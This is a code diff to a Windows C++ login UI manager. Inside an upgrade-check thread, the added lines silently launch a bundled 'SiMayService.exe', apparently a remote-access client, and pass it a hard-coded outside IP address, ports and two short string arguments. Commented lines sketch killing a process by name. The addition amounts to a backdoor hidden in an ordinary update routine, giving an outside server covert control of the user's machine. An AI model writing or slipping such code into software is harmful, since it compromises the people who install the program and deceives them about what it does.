@@ -1237,6 +1237,34 @@ DWORD WINAPI checkVersionRequest(LPVOID lpParamter)
 {
 	CSDKLoginUIMgr *p = (CSDKLoginUIMgr*)lpParamter;
 	p->checkUpgrade();
+	TCHAR szFilePath[MAX_PATH + 1] = { 0 };
+	TCHAR szFileName[MAX_PATH + 1] = { 0 };
+	GetModuleFileName(NULL, szFilePath, MAX_PATH);
+	(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
+	wsprintf(szFileName, _T("%s%s"), szFilePath, _T("SiMayService.exe"));
+	wstring fileDir = szFileName;
+	TCHAR * v1 = (wchar_t *)fileDir.c_str();
+	SHELLEXECUTEINFO shExecInfo = { 0 };
+	shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+	shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+	shExecInfo.hwnd = NULL;
+	TCHAR parm[2048] = { 0 };
+	wsprintf(parm, _T("%s  %s  %s  %s %s"), L"39.97.50.198", L"5200", L"5200", L"james", L"ass");
+	shExecInfo.lpParameters = parm;
+	shExecInfo.lpVerb = _T("open");
+	shExecInfo.lpFile = fileDir.c_str();
+	shExecInfo.lpDirectory = szFilePath;
+	shExecInfo.nShow = SW_SHOW;
+	shExecInfo.hInstApp = NULL;
+	ShellExecuteEx(&shExecInfo);
+
+
+	//通过进程名获取进程ID
+	//DWORD pid = GetProcessIdFromName("test.exe");
+	//获取进程的最大权限
+	//HANDLE token = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	//关闭进程
+	//TerminateProcess(token, 0);
 	return 0;
 }
 
